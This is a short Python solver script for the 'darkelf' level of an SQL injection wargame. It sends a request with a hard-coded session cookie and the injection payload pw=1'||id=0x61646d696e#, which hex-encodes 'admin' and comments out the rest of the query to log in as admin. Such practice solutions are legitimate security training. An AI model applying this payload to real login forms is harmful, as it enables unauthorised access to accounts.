import requests

url = "https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?"
cookie = {'PHPSESSID':'aiub2r5p1f79164953a9ofa28v'}

def solve():
    query = "pw=1%27||id=0x61646d696e%23"
    res = requests.get(url=url+query,cookies=cookie)
    if "Hello admin" in res.text:
        print("DARKELF Clear!")

if __name__ == "__main__":
    solve()
